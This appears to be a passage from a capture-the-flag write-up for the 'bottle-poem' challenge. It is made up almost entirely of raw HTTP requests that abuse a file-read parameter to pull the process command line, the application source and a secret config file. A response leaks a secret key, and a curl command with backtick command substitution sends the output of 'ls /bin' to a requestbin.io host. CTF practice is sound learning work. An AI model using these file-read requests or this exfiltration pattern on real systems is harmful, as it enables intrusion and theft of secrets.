```http
GET /show?id=/proc/thread-self/cmdline HTTP/1.1
Host: bottle-poem.ctf.sekai.team
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://bottle-poem.ctf.sekai.team/
Accept-Encoding: gzip, deflate
Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
```



```http
GET /show?id=/app/app.py HTTP/1.1
Host: bottle-poem.ctf.sekai.team
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://bottle-poem.ctf.sekai.team/
Accept-Encoding: gzip, deflate
Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
```

```http
GET /show?id=/app/config/secret.py HTTP/1.1
Host: bottle-poem.ctf.sekai.team
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://bottle-poem.ctf.sekai.team/
Accept-Encoding: gzip, deflate
Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
```

```http
HTTP/1.0 200 OK
date: Fri, 30 Sep 2022 22:02:13 GMT
server: WSGIServer/0.2 CPython/3.8.12
content-type: text/plain; charset=UTF-8
content-length: 58

sekai = "Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu"
```

curl -X POST -d "fizz=`ls /bin`" https://requestbin.io/19b9tzf1
```
fizz: bash bunzip2 bzcat bzcmp bzdiff bzegrep bzexe bzfgrep bzgrep bzip2 bzip2recover bzless bzmore cat chgrp chmod chown cp dash date dd df dir dmesg dnsdomainname domainname echo egrep false fgrep findmnt grep gunzip gzexe gzip hostname kill ln login ls lsblk mkdir mknod mktemp more mount mountpoint mv nisdomainname pidof ps pwd rbash readlink rm rmdir run-parts sed sh sleep stty su sync tar tempfile touch true umount uname uncompress vdir wdctl ypdomainname zcat zcmp zdiff zegrep zfgrep zforce zgrep zless zmore znew
```